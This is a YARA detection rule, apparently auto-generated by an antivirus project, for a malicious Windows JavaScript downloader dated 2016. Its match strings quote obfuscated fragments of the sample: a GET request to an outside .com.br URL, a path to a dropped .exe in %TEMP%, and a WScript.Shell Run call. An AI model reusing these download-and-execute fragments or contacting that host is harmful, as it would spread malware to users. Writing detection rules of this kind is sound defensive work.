rule sig_20160329_4573655b945b75909e9fd9f7a498479f {
  meta:
    description = "datamaliciousorder - file 20160329_4573655b945b75909e9fd9f7a498479f.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "5fb024cb420640b4c0a471f6cdbb9426d981a0fd827d3edb43feb1d4ebac62d9"

  strings:
    $s1  = "Nn[N](\"GET\", \"http://caferacerpneus.com.br/lw2osd\", false);" fullword ascii
    $s2  = "function bn() {return SH[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"5W3HEXQXtz8Hu.exe\";};" fullword ascii
    $s3  = "for (;;){WScript[Z](gA() * 11); if (Nn[\"readystate\"] >= 2 * 2) break;};" fullword ascii
    $s4  = "var SH = function UC() {return WScript[U](\"WScript.Shell\");}(), FH = 11;" fullword ascii
    $s5  = "function Ak(Y, L){dN = dN * 1; return Y - L;};" fullword ascii
    $s6  = "function h(){return \"\" + t;};" fullword ascii
    $s7  = "function e() {return ((yK == true) && (yK == CD)) ? 1 : dN;};" fullword ascii
    $s8  = "function wr(D){SH[\"Run\"](D, dN, dN);};" fullword ascii
    $s9  = "var gk = new this[\"Date\"]();" fullword ascii
    $s10 = "function gP(sG) {var W = (1, 2, 3, 4, 5, sG); return W;};" fullword ascii
    $s11 = "return Ak(KS, iM);" fullword ascii
    $s12 = "function hM()" fullword ascii
    $s13 = "function gA(){return 22;};" fullword ascii
    $s14 = "function g(){return U;};" fullword ascii
    $s15 = " while (P){" fullword ascii
    $s16 = "var CD = false;" fullword ascii
    $s17 = "CD = true; " fullword ascii
    $s18 = "var yK = false;" fullword ascii
    $s19 = "yK = true; " fullword ascii
    $s20 = "} catch(H){};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}